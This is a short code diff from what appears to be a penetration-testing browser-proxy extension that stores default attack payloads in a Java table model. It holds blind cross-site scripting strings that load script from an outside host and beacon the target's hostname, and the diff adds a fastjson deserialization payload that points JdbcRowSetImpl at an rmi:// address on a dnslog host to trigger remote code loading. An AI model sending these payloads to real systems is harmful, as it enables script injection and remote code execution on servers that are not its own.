@@ -50,7 +50,7 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>",ConfigEntry.Action_Append_To_header_value,true));
 		configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
 
-		configEntries.add(new ConfigEntry("CRLF", "//%0d%0a/http://www.baidu.com",ConfigEntry.Config_Custom_Payload,true));
+		configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%host.fastjson.test.dnslog.com/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
 		
 
 	}
